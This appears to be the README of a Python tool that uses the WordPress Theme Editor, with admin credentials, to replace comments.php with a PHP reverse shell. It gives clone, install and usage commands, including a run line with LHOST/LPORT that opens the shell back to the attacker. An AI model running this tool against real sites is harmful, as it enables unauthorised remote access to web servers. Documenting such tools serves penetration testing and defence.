# WordPress Theme Editor Exploit

The WordPress dashboard contains a tool called the '**Theme Editor**', allowing webpage administrators to directly edit the various files that make up their installed WordPress themes. If a threat actor is able to authenticate themselves into the WordPress dashboard of a webpage, they can then use the Theme Editor to inject their own malicious PHP code into the theme files. This then allows them to carry out further actions such as opening a reverse shell.

This exploit replaces the '**comments.php**' theme file contents with a PHP reverse shell script. It will then open the reverse shell by making a request to the comments.php file.

# Installation

* This exploit has been tested on WordPress Version **4+** and **5+**
* Developed using Python **3.9.7** (Should work fine on Python 3+)

```
# clone repo
git clone https://github.com/nisforrnicholas/WordPress-Theme-Editor-Exploit.git

# change working directory to /WordPress-Theme-Editor-Exploit
cd WordPress-Theme-Editor-Exploit

# install requirements
pip3 install -r requirements.txt
```

# Usage

Before running the exploit, you will first need to obtain the following information: **username**, **password**, **WordPress version**, **installed theme**.

These information can be easily obtained through various methods, such as using automated scanning tools like `WPScan` (https://github.com/wpscanteam/wpscan)

Once the information is prepared, set up a TCP listener in another shell. 

Then run:

```
python3 wpte_exploit.py http://<IP>:<PORT>/ <USERNAME> <PASSWORD> <WORDPRESS_VERSION> <THEME_NAME> <LHOST> <LPORT>
```

